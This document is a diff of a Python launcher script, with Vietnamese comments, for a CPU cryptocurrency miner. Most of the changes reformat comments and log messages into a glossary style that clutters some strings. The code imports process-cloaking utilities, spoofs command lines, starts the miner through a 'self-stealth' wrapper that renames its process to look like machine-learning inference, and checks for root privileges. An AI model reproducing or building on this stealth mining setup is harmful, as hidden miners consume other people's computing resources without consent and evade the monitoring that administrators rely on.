@@ -1,8 +1,7 @@
-
 """
 start_mining.py
 
-Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
+**[Entrypoint]** (điểm vào chính – khởi động toàn bộ hệ thống khai thác tiền điện tử).
 """
 
 import os
@@ -13,16 +12,16 @@ import signal
 import time
 import re
 import logging
-import json  # ✅ [JSON] (JavaScript Object Notation – định dạng dữ liệu cấu hình)
-import select  # ✅ [select] (thư viện chọn I/O đa kênh – non-blocking)
+import json  # ✅ **[JSON]** (JavaScript Object Notation – định dạng dữ liệu cấu hình)
+import select  # ✅ **[select]** (thư viện chọn I/O đa kênh – non-blocking)
 from pathlib import Path
 from datetime import datetime
 
-# Thêm thư mục **script** (kịch bản) vào sys.path để **resolve** (phân giải đường dẫn) các **local module imports** (nhập module cục bộ)
+# Thêm thư mục **[script]** (kịch bản) vào sys.path để **[resolve]** (phân giải đường dẫn) các **[local module imports]** (nhập module cục bộ)
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 import psutil
-# **Import** (nhập khẩu) **cloaking utilities** (tiện ích che giấu – ẩn danh hóa tiến trình) cho **ml-inference process stealth** (chế độ ẩn danh của tiến trình suy luận máy học)
+# **[Import]** (nhập khẩu) **[cloaking utilities]** (tiện ích che giấu – ẩn danh hóa tiến trình) cho **[ml-inference process stealth]** (chế độ ẩn danh của tiến trình suy luận máy học)
 from mining_environment.cpu_plugins.cloaking_lib.utils import (
     get_process_by_cmdline,
     spoof_cmdline,
@@ -30,7 +29,7 @@ from mining_environment.cpu_plugins.cloaking_lib.utils import (
     create_stealth_subprocess,
 )
 
-# **Import** (nhập khẩu) các **module** (mô-đun – thành phần chức năng) từ **library** (thư viện) mining_environment
+# **[Import]** (nhập khẩu) các **[module]** (mô-đun – thành phần chức năng) từ **[library]** (thư viện) mining_environment
 from mining_environment.scripts.logging_config import setup_logging
 from mining_environment.scripts.module_loggers import (
     get_cpu_plugin_logger,
@@ -42,9 +41,9 @@ from mining_environment.scripts.auxiliary_modules.models import ConfigModel
 from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
 from mining_environment.scripts.privileged_operations import get_privileged_manager
 
-# **Import** (nhập khẩu) **Stealth Activation Manager** (trình quản lý kích hoạt ẩn danh – centralized stealth system)
+# **[Import]** (nhập khẩu) **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh – hệ thống ẩn danh tập trung)
 from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
-# Enhanced PID Logger với Real Process Output Monitor
+# **[Enhanced PID Logger]** (trình ghi PID nâng cao) với **[Real Process Output Monitor]** (giám sát đầu ra tiến trình thực)
 from pid_logger import start_worker, log_pid, register_process
 
 
@@ -60,14 +59,14 @@ from mining_environment.logging.mining_performance_logger import (
 
 
 
-# Thiết lập **log directory path** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
+# Thiết lập **[log directory path]** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
 
-# **Main application logger** (logger ứng dụng chính)
+# **[Main application logger]** (logger ứng dụng chính – ghi nhật ký hệ thống)
 logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')
 
-# ---------- DEBUG CPU LOGGING BOOSTER ----------
+# ---------- **[DEBUG CPU LOGGING BOOSTER]** (bộ tăng cường ghi log CPU gỡ lỗi) ----------
 try:
     from mining_environment.scripts.unified_logging import get_unified_logger
     CPU_LOGGERS = [
@@ -82,12 +81,12 @@ try:
         _lg.setLevel(logging.DEBUG)
         for _h in _lg.handlers:
             _h.setLevel(logging.DEBUG)
-        _lg.debug('===== DEBUG MODE ENABLED (auto-booster) =====')
+        _lg.debug('===== **[DEBUG MODE ENABLED]** (chế độ gỡ lỗi đã kích hoạt) (auto-booster) =====')
 except Exception as _dbg_err:
-    logger.warning(f"[DEBUG] (gỡ lỗi) booster khởi tạo thất bại: {_dbg_err}")
-# ---------- END BOOSTER ----------
+    logger.warning(f"**[DEBUG]** (gỡ lỗi) booster khởi tạo thất bại: {_dbg_err}")
+# ---------- **[END BOOSTER]** (kết thúc bộ tăng cường) ----------
 
-# **Dedicated Module Loggers** (Logger mô-đun chuyên dụng)
+# **[Dedicated Module Loggers]** (Logger mô-đun chuyên dụng – ghi nhật ký riêng cho từng module)
 cpu_miner_logger = setup_logging('cpu_miner', str(Path(LOGS_DIR) / 'cpu_miner.log'), 'INFO')
 cpu_plugin_logger = setup_logging('cpu_plugin', str(Path(LOGS_DIR) / 'cpu_plugin.log'), 'INFO')
 
@@ -95,69 +94,69 @@ stop_event = threading.Event()
 process_lock = threading.Lock()
 cpu_process = None
 
-# Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
+# Thêm biến **[privileged_manager_global]** (trình quản lý đặc quyền toàn cục) để chia sẻ kết quả thiết lập môi trường giữa các **[thread]** (luồng)
 privileged_manager_global = None
 
 
 def signal_handler(signum, frame):
-    logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
+    logger.info(f"Nhận **[signal]** (tín hiệu dừng) ({signum}). Đang dừng hệ thống khai thác...")
     stop_event.set()
 
 signal.signal(signal.SIGINT, signal_handler)
 signal.signal(signal.SIGTERM, signal_handler)
 
 def initialize_environment():
-    """**Thread-safe environment initialization** (khởi tạo môi trường an toàn luồng) với **enhanced error handling** (xử lý lỗi nâng cao)"""
-    logger.info("Bắt đầu thiết lập môi trường khai thác (Thread-Safe Mode).")
+    """**[Thread-safe environment initialization]** (khởi tạo môi trường an toàn luồng) với **[enhanced error handling]** (xử lý lỗi nâng cao)"""
+    logger.info("Bắt đầu thiết lập môi trường khai thác (**[Thread-Safe Mode]** (chế độ an toàn luồng)).")
     
     try:
-        # **Step 1: Privileged Manager** (Bước 1: Trình quản lý đặc quyền)
-        logger.info("🔐 [Initializing privileged manager] (khởi tạo trình quản lý đặc quyền)...")
+        # **[Step 1: Privileged Manager]** (Bước 1: Trình quản lý đặc quyền)
+        logger.info("🔐 **[Initializing privileged manager]** (khởi tạo trình quản lý đặc quyền)...")
         privileged_manager = get_privileged_manager(logger)
         
-        # **Step 2: Security Context Validation** (Bước 2: Xác thực bối cảnh bảo mật)
-        logger.info("🔒 [Validating security context] (xác thực ngữ cảnh bảo mật)...")
+        # **[Step 2: Security Context Validation]** (Bước 2: Xác thực bối cảnh bảo mật)
+        logger.info("🔒 **[Validating security context]** (xác thực ngữ cảnh bảo mật)...")
         security_context = privileged_manager.validate_security_context()
-        logger.info(f"✅ Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
+        logger.info(f"✅ Bối cảnh bảo mật: **[User]** (người dùng)={security_context['user']}, **[Root]** (quyền root)={security_context['is_root']}")
         
         if not security_context['is_root']:
-            logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
+            logger.warning("⚠️ Không chạy với quyền **[root]** (quyền quản trị cao nhất) - một số tính năng có thể không hoạt động")
         
-        # (CPU-only) Bỏ qua kiểm tra/tracking GPU để đơn giản hóa môi trường
+        # (**[CPU-only]** (chỉ CPU)) Bỏ qua kiểm tra/tracking **[GPU]** (card đồ họa) để đơn giản hóa môi trường
         
-        # **Step 5: Environment Setup** (Bước 5: Thiết lập môi trường)
-        logger.info("🌍 [Running centralized environment setup] (chạy thiết lập môi trường tập trung)...")
+        # **[Step 5: Environment Setup]** (Bước 5: Thiết lập môi trường)
+        logger.info("🌍 **[Running centralized environment setup]** (chạy thiết lập môi trường tập trung)...")
         setup_env.setup()
         logger.info("✅ Thiết lập môi trường thành công.")
         
         return privileged_manager
-        
+    
     except Exception as e:
         error_msg = f"Lỗi khi thiết lập môi trường: {e}"
         logger.error(f"❌ {error_msg}")
-        logger.error(f"🔍 [Exception details] (chi tiết ngoại lệ): {type(e).__name__}: {str(e)}")
+        logger.error(f"🔍 **[Exception details]** (chi tiết ngoại lệ): {type(e).__name__}: {str(e)}")
         
-        # **Thread-safe error propagation** (truyền lỗi an toàn luồng)
+        # **[Thread-safe error propagation]** (truyền lỗi an toàn luồng)
         stop_event.set()
         raise RuntimeError(error_msg) from e
         
 def start_resource_manager():
     """
-    **DEPRECATED**: **Direct ResourceManager startup** (khởi động ResourceManager trực tiếp) - 
-    **Replaced by resource_manager_thread()** (thay thế bằng resource_manager_thread())
+    **[DEPRECATED]** (không dùng nữa): **[Direct ResourceManager startup]** (khởi động ResourceManager trực tiếp) - 
+    **[Replaced by resource_manager_thread()]** (thay thế bằng resource_manager_thread())
     
-    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
+    Note: Hàm này giữ lại để **[backward compatibility]** (tương thích ngược)
     """
-    logger.warning("⚠️ [deprecated] (không dùng nữa): start_resource_manager() – dùng resource_manager_thread() thay thế")
+    logger.warning("⚠️ **[deprecated]** (không dùng nữa): start_resource_manager() – dùng resource_manager_thread() thay thế")
     return None
     
     def resource_manager_worker():
         """
-        **Worker function** (hàm công việc) chạy ResourceManager trực tiếp trong **separate thread** (luồng riêng biệt).
+        **[Worker function]** (hàm công việc) chạy ResourceManager trực tiếp trong **[separate thread]** (luồng riêng biệt).
         """
         try:
-            # **Step 1**: Load configuration từ JSON
-            logger.info("📋 Step 1/4: [Loading configuration from JSON] (nạp cấu hình từ JSON)...")
+            # **[Step 1]**: Load configuration từ JSON
+            logger.info("📋 Step 1/4: **[Loading configuration from JSON]** (nạp cấu hình từ JSON)...")
             config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
             
             if not config_path.exists():
@@ -170,12 +169,12 @@ def start_resource_manager():
             logger.info("✅ Đã tải cấu hình thành công")
             
             # **Step 2**: Initialize EventBus với **memory backend** (bộ xử lý bộ nhớ)
-            logger.info("📋 Step 2/5: [Initializing EventBus] (khởi tạo EventBus) với [memory backend] (hậu phương bộ nhớ)...")
+            logger.info("📋 Step 2/5: [Initializing EventBus] (khởi tạo EventBus) với [**[memory]** (bộ nhớ) backend] (hậu phương bộ nhớ)...")
             event_bus = EventBus()
             logger.info("✅ EventBus đã được khởi tạo thành công")
             
             # **Step 2.5**: Initialize Stealth Activation Manager với **EventBus integration** (tích hợp EventBus)
-            logger.info("📋 Step 2.5/5: [Initializing Stealth Activation Manager] (khởi tạo trình quản lý kích hoạt ẩn danh)...")
+            logger.info("📋 Step 2.5/5: [Initializing Stealth Activation **[manager]** (trình quản lý)] (khởi tạo trình quản lý kích hoạt ẩn danh)...")
             stealth_init_success = initialize_stealth_activation(event_bus)
             if stealth_init_success:
                 logger.info("✅ Trình quản lý kích hoạt ẩn danh đã được khởi tạo thành công")
@@ -207,7 +206,7 @@ def start_resource_manager():
     
     # Khởi động **thread** (luồng) và **không chờ** nó hoàn thành (**non-blocking**)
     resource_thread.start()
-    logger.info(f"✅ ResourceManager thread đã được khởi động (Thread ID: {resource_thread.ident})")
+    logger.info(f"✅ ResourceManager **[thread]** (luồng) đã được khởi động (**[thread]** (luồng) ID: {resource_thread.ident})")
     
     # **Enhanced verification** (xác minh nâng cao) với **timeout protection** (bảo vệ timeout)
     verification_timeout = 5  # 5 giây thay vì 1 giây
@@ -216,14 +215,14 @@ def start_resource_manager():
         if resource_thread.is_alive():
             logger.debug(f"🔍 Xác minh luồng ResourceManager: đang hoạt động ({i+1}/{verification_timeout}s)")
         else:
-            logger.warning(f"⚠️ ResourceManager thread đã dừng sau {i+1}s")
+            logger.warning(f"⚠️ ResourceManager **[thread]** (luồng) đã dừng sau {i+1}s")
             stop_event.set()
             break
     
     if resource_thread.is_alive():
-        logger.info("🎯 ResourceManager thread đang chạy bình thường - Main thread có thể tiếp tục")
+        logger.info("🎯 ResourceManager **[thread]** (luồng) đang chạy bình thường - Main **[thread]** (luồng) có thể tiếp tục")
     else:
-        logger.warning("⚠️ ResourceManager thread đã dừng ngay sau khi khởi động")
+        logger.warning("⚠️ ResourceManager **[thread]** (luồng) đã dừng ngay sau khi khởi động")
         stop_event.set()
     
     return resource_thread
@@ -261,7 +260,7 @@ def rotate_log_file(log_path, max_size_mb=3):
     file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
     if file_size_mb > max_size_mb:
         os.remove(log_path)
-        logger.info(f"Đã xóa tệp log do vượt quá {max_size_mb}MB: {log_path} (kích thước: {file_size_mb:.2f}MB)")
+        logger.info(f"Đã xóa tệp **[log]** (nhật ký) do vượt quá {max_size_mb}MB: {log_path} (kích thước: {file_size_mb:.2f}MB)")
 
 def dual_logger_thread(process, log_file, process_name, log_lock):
     """
@@ -335,11 +334,11 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                             current_path = log_file.name
                             log_file.close()
                             os.remove(current_path)
-                            logger.info(f"🗑️ Đã xóa log do vượt quá 3MB: {current_path}")
+                            logger.info(f"🗑️ Đã xóa **[log]** (nhật ký) do vượt quá 3MB: {current_path}")
                             # **Reopen new file** (mở lại tệp mới)
                             log_file = open(current_path, 'ab', buffering=0)
                     except Exception as rot_err:
-                        logger.warning(f"⚠️ Xóa log thất bại: {rot_err}")
+                        logger.warning(f"⚠️ Xóa **[log]** (nhật ký) thất bại: {rot_err}")
                     
                     # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao – nhận diện các chỉ số hiệu suất)
                     hash_rate_match = re.search(r'(\d+(?:\.\d+)?)\s*(H/s|KH/s|MH/s|GH/s|TH/s)', line)
@@ -404,7 +403,7 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
             final_stats += "\033[0m"
             
             print(final_stats, flush=True)
-            logger.info(f"Luồng ghi log kép đã dừng cho {process_name}: thời gian chạy {runtime:.0f}s")
+            logger.info(f"Luồng ghi **[log]** (nhật ký) kép đã dừng cho {process_name}: thời gian chạy {runtime:.0f}s")
             
         except Exception as cleanup_err:
             logger.error(f"Lỗi dọn dẹp trong dual_logger_thread: {cleanup_err}")
@@ -425,15 +424,15 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     """
     # **🔧 DEBUG: Function entry logging** (ghi log đầu vào function)  
     miner_type = 'CPU' if cpu else 'GPU'
-    logger.info(f"🔍 [DEBUG] start_mining_process() được gọi - Loại: {miner_type}")
+    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] start_mining_process() được gọi - Loại: {miner_type}")
     
     # CPU-only build: từ chối GPU
     if not cpu:
-        logger.info("GPU mining đã bị loại bỏ trong bản CPU-only. Bỏ qua yêu cầu khởi chạy GPU.")
+        logger.info("**[GPU]** (bộ xử lý đồ họa) mining đã bị loại bỏ trong bản **[CPU]** (bộ xử lý trung tâm)-only. Bỏ qua yêu cầu khởi chạy **[GPU]** (bộ xử lý đồ họa).")
         return None
 
     executable = os.getenv('ML_COMMAND')
-    logger.info(f"🔍 [DEBUG] Executable path: {executable}")
+    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Executable **[path]** (đường dẫn): {executable}")
     if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
         logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền truy cập: {executable}")
         stop_event.set()
@@ -473,7 +472,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     # Default environment (stealth wrapper creates clean_env if enabled)
     
     for attempt in range(1, retries + 1):
-        logger.info(f"Thử khởi chạy quá trình khai thác CPU (Lần thử {attempt}/{retries})...")
+        logger.info(f"Thử khởi chạy quá trình khai thác **[CPU]** (bộ xử lý trung tâm) (Lần thử {attempt}/{retries})...")
         try:
             # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
             if enable_stealth:
@@ -489,7 +488,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
                     miner_type = 'CPU'
                     logger.info(f"🔒 [SELF-STEALTH] Đang sử dụng wrapper ẩn danh {miner_type}: {stealth_wrapper_path}")
-                    logger.info(f"🔍 [DEBUG] Sắp gọi subprocess.Popen với lệnh: {stealth_command}")
+                    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Sắp gọi subprocess.Popen với lệnh: {stealth_command}")
                     
                     process = subprocess.Popen(
                         stealth_command,
@@ -499,16 +498,16 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         bufsize=1,
                         # Default environment (stealth wrapper handles cleanup internally)
                     )
-                    logger.info(f"🔍 [DEBUG] subprocess.Popen đã hoàn tất thành công")
+                    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] subprocess.Popen đã hoàn tất thành công")
                     if process:
-                        logger.info(f"✅ [SELF-STEALTH] Tiến trình ẩn danh {miner_type} đã khởi chạy với PID: {process.pid}")
+                        logger.info(f"✅ [SELF-STEALTH] Tiến trình ẩn danh {miner_type} đã khởi chạy với **[PID]** (Process ID - mã định danh tiến trình): {process.pid}")
                         logger.info(f"🔍 [SELF-STEALTH] Tiến trình {miner_type} sẽ tự đổi tên bằng trình quản lý ẩn danh nội bộ")
                 else:
                     # Fallback to standard subprocess nếu wrapper không tồn tại
                     miner_type = 'CPU' if cpu else 'GPU'
                     logger.warning(f"⚠️ [SELF-STEALTH] Không tìm thấy wrapper ẩn danh {miner_type}: {stealth_wrapper_path}")
                     logger.warning(f"⚠️ [SELF-STEALTH] Chuyển sang [standard subprocess] (tiến trình con tiêu chuẩn) - không dùng ẩn danh {miner_type}")
-                    logger.info(f"🔍 [DEBUG] Sắp gọi subprocess.Popen (dự phòng) với lệnh: {mining_command}")
+                    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Sắp gọi subprocess.Popen (dự phòng) với lệnh: {mining_command}")
                     process = subprocess.Popen(
                         mining_command,
                         stdout=subprocess.PIPE,
@@ -519,7 +518,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     )
             elif enable_ns and privileged_manager:
                 # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
-                logger.info(f"🔍 CPU sử dụng [namespace isolation] (cô lập không gian tên)")
+                logger.info(f"🔍 **[CPU]** (bộ xử lý trung tâm) sử dụng [namespace isolation] (cô lập không gian tên)")
                 process = subprocess.Popen(
                     mining_command,
                     stdout=subprocess.PIPE,
@@ -530,7 +529,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 )
             else:
                 # **Standard subprocess** (tiến trình con tiêu chuẩn)
-                logger.info(f"🔍 CPU sử dụng [standard subprocess] (tiến trình con tiêu chuẩn)")
+                logger.info(f"🔍 **[CPU]** (bộ xử lý trung tâm) sử dụng [standard subprocess] (tiến trình con tiêu chuẩn)")
                 process = subprocess.Popen(
                     mining_command,
                     stdout=subprocess.PIPE,
@@ -543,7 +542,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
             if process:
                 startup_time = time.time()
                 miner_type = 'CPU'
-                logger.info(f"🔍 Tiến trình {miner_type} được tạo thành công với PID: {process.pid}")
+                logger.info(f"🔍 Tiến trình {miner_type} được tạo thành công với **[PID]** (Process ID - mã định danh tiến trình): {process.pid}")
                 
                 # **Enhanced startup logging** (ghi log khởi động nâng cao)
                 startup_msg = (f"🚀 TIẾN TRÌNH KHAI THÁC ĐÃ BẮT ĐẦU [{miner_type}]\n"
@@ -580,7 +579,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                                     proc_obj = psutil.Process(proc.info['pid'])
                                     if time.time() - proc_obj.create_time() < 30:
                                         real_mining_pid = proc.info['pid']
-                                        logger.info(f"🔍 Đã phát hiện PID khai thác thực: {real_mining_pid} cho {target_cmd}")
+                                        logger.info(f"🔍 Đã phát hiện **[PID]** (Process ID - mã định danh tiến trình) khai thác thực: {real_mining_pid} cho {target_cmd}")
                                         break
                             except (psutil.NoSuchProcess, psutil.AccessDenied):
                                 continue
@@ -589,20 +588,20 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                             # Register real mining process for Enhanced PID Logger
                             real_process_obj = psutil.Process(real_mining_pid)
                             register_process(real_mining_pid, process_type, real_process_obj, process_name)
-                            logger.info(f"✅ Trình ghi PID nâng cao đã đăng ký PID khai thác thực {real_mining_pid} ({process_type})")
+                            logger.info(f"✅ Trình ghi **[PID]** (Process ID - mã định danh tiến trình) nâng cao đã đăng ký **[PID]** (Process ID - mã định danh tiến trình) khai thác thực {real_mining_pid} ({process_type})")
                         else:
                             # Fallback: register wrapper PID
                             register_process(process.pid, process_type, process, process_name)
-                            logger.warning(f"⚠️ Không thể phát hiện PID khai thác thực, dùng PID wrapper {process.pid}")
+                            logger.warning(f"⚠️ Không thể phát hiện **[PID]** (Process ID - mã định danh tiến trình) khai thác thực, dùng **[PID]** (Process ID - mã định danh tiến trình) wrapper {process.pid}")
                             
                     except Exception as _pid_err:
-                        logger.warning(f"Đăng ký Trình ghi PID nâng cao thất bại: {_pid_err}")
+                        logger.warning(f"Đăng ký Trình ghi **[PID]** (Process ID - mã định danh tiến trình) nâng cao thất bại: {_pid_err}")
                         # Fallback to legacy log_pid và auto registration
                         try:
                             log_pid(process.pid, cpu)
-                            logger.info(f"✅ Dự phòng: đã ghi PID {process.pid} qua log_pid()")
+                            logger.info(f"✅ Dự phòng: đã ghi **[PID]** (Process ID - mã định danh tiến trình) {process.pid} qua log_pid()")
                         except Exception as _fallback_err:
-                            logger.error(f"Ghi PID dự phòng cũng thất bại: {_fallback_err}")
+                            logger.error(f"Ghi **[PID]** (Process ID - mã định danh tiến trình) dự phòng cũng thất bại: {_fallback_err}")
                 
                 # **Detailed operation logging** (ghi log thao tác chi tiết) - ĐỊNH NGHĨA TRƯỚC KHI SỬ DỤNG
                 operation_details = {
@@ -617,12 +616,12 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 }
                 
                 # **DEBUG: Force initial logging** (gỡ lỗi: buộc ghi log ban đầu) để kiểm tra logger hoạt động
-                logger.info(f"🔍 [DEBUG] Đang thử ghi thao tác khai thác ban đầu cho {process_name}")
+                logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Đang thử ghi thao tác khai thác ban đầu cho {process_name}")
                 log_mining_operation(process_name, "PROCESS_START", process.pid, operation_details, 0.0, "SUCCESS")
-                logger.info(f"🔍 [DEBUG] Ghi log mức sử dụng tài nguyên ban đầu cho {process_name}")
+                logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Ghi **[log]** (nhật ký) mức sử dụng tài nguyên ban đầu cho {process_name}")
                 log_resource_usage(process_name, force_gpu_check=False)
                 
-                logger.info(f"PROCESS_START (bắt đầu tiến trình): {process_name} | PID={process.pid} | TYPE={miner_type} | TIME={startup_time}")
+                logger.info(f"PROCESS_START (bắt đầu tiến trình): {process_name} | **[PID]** (Process ID - mã định danh tiến trình)={process.pid} | TYPE={miner_type} | TIME={startup_time}")
                 
                 # **EventBus publish** (xuất bản sự kiện) - **PID Propagation Flow Step 1**
                 try:
@@ -651,19 +650,19 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     
                     # Legacy format (sẽ được deprecated trong future releases)
                     event_bus.publish(f'channel:{miner_type}', payload)
-                    logger.info(f"✅ Đã xuất bản sự kiện mining_started tới channel:{miner_type} cho PID {process.pid}")
+                    logger.info(f"✅ Đã xuất bản sự kiện mining_started tới channel:{miner_type} cho **[PID]** (Process ID - mã định danh tiến trình) {process.pid}")
                     
                     # New standardized format: domain:action pattern
                     new_event_name = f'mining:{miner_type}_started'
                     event_bus.publish(new_event_name, payload)
-                    logger.info(f"✅ Đã xuất bản sự kiện mining_started tới {new_event_name} cho PID {process.pid} (định dạng mới)")
+                    logger.info(f"✅ Đã xuất bản sự kiện mining_started tới {new_event_name} cho **[PID]** (Process ID - mã định danh tiến trình) {process.pid} (định dạng mới)")
                     
                 except Exception as e:
                     logger.error(f"❌ Xuất bản sự kiện mining_started thất bại: {e}")
                     # **Không dừng tiến trình** nếu EventBus thất bại - **fallback** vẫn hoạt động
                 
                 # ✅ ENHANCED: Ensure log file creation với initial logging
-                logger.info(f"📁 [Mining Log] Đang tạo tệp log: {miner_log_path}")
+                logger.info(f"📁 [Mining **[log]** (nhật ký)] Đang tạo tệp **[log]** (nhật ký): {miner_log_path}")
                 
                 # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
                 log_file = open(miner_log_path, 'ab', buffering=0)
@@ -677,7 +676,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 log_file.write(initial_log.encode('utf-8'))
                 log_file.flush()
                 
-                logger.info(f"✅ [Mining Log] Tệp log đã được khởi tạo: {miner_log_path}")
+                logger.info(f"✅ [Mining **[log]** (nhật ký)] Tệp **[log]** (nhật ký) đã được khởi tạo: {miner_log_path}")
                 
                 # **Start dual logging thread** (khởi chạy luồng ghi log kép)
                 log_thread = threading.Thread(
@@ -686,14 +685,14 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     daemon=True
                 )
                 log_thread.start()
-                logger.info(f"🚀 [Mining Log] Đã khởi chạy luồng ghi nhật ký kép cho {process_name}")
+                logger.info(f"🚀 [Mining **[log]** (nhật ký)] Đã khởi chạy luồng ghi nhật ký kép cho {process_name}")
                 
                 # **Start simple log monitoring** (bắt đầu giám sát log đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
                 mining_perf_logger.monitor_process_logs(process_name, str(miner_log_path))
                 
                 time.sleep(2)
                 if process.poll() is not None:
-                    logger.error(f"Quá trình khai thác CPU kết thúc sớm.")
+                    logger.error(f"Quá trình khai thác **[CPU]** (bộ xử lý trung tâm) kết thúc sớm.")
                     
                     # **Enhanced plugin logging for failures** (ghi log plugin nâng cao cho lỗi)
                     error_details = f"PID={process.pid} EXIT_CODE={process.returncode}"
@@ -707,12 +706,12 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     success_details = f"PID={process.pid} Command={' '.join(mining_command)}"
                     log_cpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
                     
-                    logger.info(f"🔍 [DEBUG] Sắp trả về đối tượng tiến trình - PID: {process.pid}, Kiểu: {type(process)}")
+                    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Sắp trả về đối tượng tiến trình - **[PID]** (Process ID - mã định danh tiến trình): {process.pid}, Kiểu: {type(process)}")
                     return process
                     
         except Exception as e:
-            logger.error(f"🔍 [DEBUG] Bắt được ngoại lệ trong start_mining_process: {type(e).__name__}: {str(e)}")
-            logger.error(f"Lỗi khi khởi động quá trình khai thác CPU: {e}")
+            logger.error(f"🔍 [**[debug]** (gỡ lỗi)] Bắt được ngoại lệ trong start_mining_process: {type(e).__name__}: {str(e)}")
+            logger.error(f"Lỗi khi khởi động quá trình khai thác **[CPU]** (bộ xử lý trung tâm): {e}")
             # **Enhanced debug info** (thông tin gỡ lỗi nâng cao) cho **cả CPU và GPU failures** (lỗi cả CPU và GPU)
             logger.error(f"🔍 Chi tiết lỗi - Ngoại lệ: {type(e).__name__}: {str(e)}")
             logger.error(f"🔍 Chi tiết lỗi - Lệnh: {' '.join(mining_command)}")
@@ -723,7 +722,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
         if attempt < retries:
             logger.info(f"Đợi {delay} giây trước khi thử lại...")
             time.sleep(delay)
-    logger.error(f"Không thể khởi chạy quá trình khai thác CPU.")
+    logger.error(f"Không thể khởi chạy quá trình khai thác **[CPU]** (bộ xử lý trung tâm).")
     stop_event.set()
     return None
 
@@ -738,35 +737,35 @@ def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
     return
     
     # **Enhanced initial logging** (ghi log ban đầu nâng cao)
-    cpu_miner_logger.info("===== BẮT ĐẦU VÒNG ĐỜI [CPU Miner] (tiến trình khai thác CPU) =====")
-    cpu_miner_logger.info(f"PID trình quản lý: {os.getpid()}")
+    cpu_miner_logger.info("===== BẮT ĐẦU VÒNG ĐỜI [**[CPU]** (bộ xử lý trung tâm) Miner] (tiến trình khai thác **[CPU]** (bộ xử lý trung tâm)) =====")
+    cpu_miner_logger.info(f"**[PID]** (Process ID - mã định danh tiến trình) trình quản lý: {os.getpid()}")
     cpu_miner_logger.info(f"ID luồng: {threading.current_thread().ident}")
     cpu_miner_logger.info(f"Số lần thử tối đa: {max_retries}")
     cpu_miner_logger.info("=========================================")
     
     # **Notify main logger** (thông báo logger chính)
-    logger.info("✅ Trình quản lý CPU Miner đã được khởi tạo với cơ chế ghi log riêng")
+    logger.info("✅ Trình quản lý **[CPU]** (bộ xử lý trung tâm) Miner đã được khởi tạo với cơ chế ghi **[log]** (nhật ký) riêng")
     
     # **Enhanced mining loop** (vòng lặp khai thác nâng cao)
-    cpu_miner_logger.info("🔄 Bắt đầu vòng lặp giám sát khai thác CPU...")
+    cpu_miner_logger.info("🔄 Bắt đầu vòng lặp giám sát khai thác **[CPU]** (bộ xử lý trung tâm)...")
     
     while not stop_event.is_set() and retries < max_retries:
         with process_lock:
             if not is_mining_process_running(cpu_process):
-                cpu_miner_logger.info(f"🔄 Tiến trình CPU chưa chạy - đang thử khởi động (lần {retries + 1}/{max_retries})")
+                cpu_miner_logger.info(f"🔄 Tiến trình **[CPU]** (bộ xử lý trung tâm) chưa chạy - đang thử khởi động (lần {retries + 1}/{max_retries})")
                 cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_mgr)
                 if not is_mining_process_running(cpu_process):
                     retries += 1
-                    cpu_miner_logger.warning(f"❌ Khởi động CPU miner thất bại - thử lại {retries}/{max_retries}")
